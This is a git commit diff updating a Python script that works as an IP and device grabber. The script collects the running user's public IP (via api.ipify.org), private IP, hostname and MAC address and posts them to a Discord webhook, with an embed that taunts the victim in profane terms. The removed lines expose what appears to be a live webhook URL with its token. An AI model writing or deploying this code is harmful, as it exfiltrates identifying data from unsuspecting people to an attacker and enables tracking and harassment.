a0a67ee8a46bc681f20c796e894f3b54a8f0dc04
Solomonexy <109293447+Solomonexy@users.noreply.github.com>
2023-03-23 20:20:55 +1100

    Update Main.py

--- Main.py
+++ Main.py
@@ -1,42 +1,50 @@
 import requests
+import json
 import socket
-import psutil
+import uuid
 
-# Replace the URL with your Discord webhook URL
-webhook_url = "https://discord.com/api/webhooks/1085883831975936090/kOziiweqXalMMWvbzlD8ppEEopHcyx3anwZVicNJYjQ18ykydICRwZKn6LBUnMaJAQZD"
+# Replace this with the URL for your Discord webhook
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1234567890/abcdefg'
 
-# Get the public and private IP address
-public_ip = requests.get("https://api.ipify.org").text
+# Get the device name and MAC address
+device_name = socket.gethostname()
+device_type = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big'))
+
+# Get the public and private IP addresses
+ip = requests.get('https://api.ipify.org').text
 private_ip = socket.gethostbyname(socket.gethostname())
 
-# Get the MAC address and device name
-mac_address = ':'.join(hex(i)[2:].zfill(2) for i in psutil.net_if_stats()['Ethernet'].address_bytes)
-device_name = socket.gethostname()
-
-# Create the embed
-embed = {
-    "title": "360 FUCKIN NOSCOPED!",
-    "color": 16711680,  # Red
-    "footer": {
-        "text": "Discord.gg/"
-    },
-    "fields": [
+# Define the data for the embed message
+data = {
+    'content': '',
+    'embeds': [
         {
-            "name": "IP Address",
-            "value": f"Public: {public_ip}\nPrivate: {private_ip}",
-            "inline": False
-        },
-        {
-            "name": "Device Info",
-            "value": f"MAC Address: {mac_address}\nDevice Name: {device_name}",
-            "inline": False
+            'title': '360 Noscoped!',
+            'description': 'Get rekt noob u trash',
+            'fields': [
+                {
+                    'name': 'IP Address',
+                    'value': f'Public IP: {ip}\nPrivate IP: {private_ip}',
+                    'inline': False
+                },
+                {
+                    'name': 'Device Info',
+                    'value': f'Device Name: {device_name}\nDevice Type: {device_type}',
+                    'inline': False
+                }
+            ],
+            'footer': {
+                'text': 'Get fucking beamed skid'
+            }
         }
     ]
 }
 
-# Send the message
-response = requests.post(webhook_url, json={"embeds": [embed]})
-if response.status_code != 204:
-    print(f"Failed to send message: {response.text}")
+# Send the message to the webhook
+response = requests.post(WEBHOOK_URL, data=json.dumps(data), headers={'Content-Type': 'application/json'})
+
+# Check the response status code
+if response.status_code == 204:
+    print('Message sent successfully!')
 else:
-    print("Message sent successfully!")
+    print(f'Error sending message: {response.text}')
